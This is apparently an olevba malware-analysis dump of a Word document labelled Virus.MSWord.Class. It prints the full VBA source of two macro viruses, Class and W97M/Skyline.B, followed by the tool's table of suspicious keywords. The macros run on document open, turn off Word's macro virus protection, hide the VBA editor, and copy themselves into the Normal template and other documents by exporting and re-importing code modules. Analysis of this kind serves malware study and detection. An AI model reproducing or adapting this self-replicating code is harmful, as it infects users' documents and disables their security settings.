olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ex
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ex - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'$$0000005
Const SluzhFile = "c:\windows\class.sys"
Sub AutoOpen()
    On Error GoTo out
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    ad = Val(Right(Trim(ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1)), 7))
    nt = Val(Right(Trim(NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1)), 7))
    If nt = 0 Or nt < ad Then
        Set Host = NormalTemplate.VBProject.VBComponents.Item(1)
        ActiveDocument.VBProject.VBComponents.Item(1).export SluzhFile
    Else
        If ad = 0 Or ad < nt Then Set Host = ActiveDocument.VBProject.VBComponents.Item(1) Else GoTo out
    End If
    While Host.codemodule.CountOfLines > 0
       Host.codemodule.deletelines 1
    Wend
    Host.codemodule.AddFromFile (SluzhFile)
    For x = 1 To 4
        Host.codemodule.deletelines 1
    Next x
    If nt = 0 Or nt < ad Then
        Host.codemodule.replaceline 3, "Sub AutoClose()"
        Host.codemodule.replaceline 29, "Sub ToolsMacro()"
    End If
out:
End Sub
Sub ViewVBCode()
End Sub
-------------------------------------------------------------------------------
VBA MACRO Skyline.bas 
in file: ./Virus.MSWord.Class.ex - OLE stream: 'Macros/VBA/Skyline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Name - W97M/Skyline.B
'Author - [Bench]
Dim DeleteMe As Boolean
Sub AutoOpen()
On Error Resume Next
SetAttr NormalTemplate.FullName, vbNormal
If Application.ShowVisualBasicEditor = True Then _
    Application.ShowVisualBasicEditor = False
Call BenchCore
End Sub
Sub ViewVBCode()
On Error Resume Next
DeleteMe = True
With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "Skyline MV"
    .Text = "You thought you got rid of me, but I'm Still here, better and stronger!"
    .Animation = msoAnimationGreeting
    .Show
End With
Call BenchCore
'Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next
DeleteMe = True
'Dialogs(wdDialogToolsMacro).Show
End Sub
Sub ToolsCustomize()
On Error Resume Next
DeleteMe = True
End Sub
Sub ViewSecurity()
On Error Resume Next
MsgBox "Access is Restricted!", vbCritical, "Microsoft Word"
End Sub
Sub BenchCore()
On Error Resume Next
ModulName = "Skyline"
FileName = "ascii.vxd"
If MacroContainer = NormalTemplate Then
Set Carrier = NormalTemplate.VBProject.VBComponents
Set Host = ActiveDocument.VBProject.VBComponents
Else
Set Carrier = ActiveDocument.VBProject.VBComponents
Set Host = NormalTemplate.VBProject.VBComponents
End If
If Host(ModulName).Name <> ModulName Then
Carrier(ModulName).export "c:\ascii.vxd"
Host.Import ("c:\ascii.vxd")
End If
If ActiveDocument.Content.Characters.Count = 0 Then ActiveDocument.Saved = True Else ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

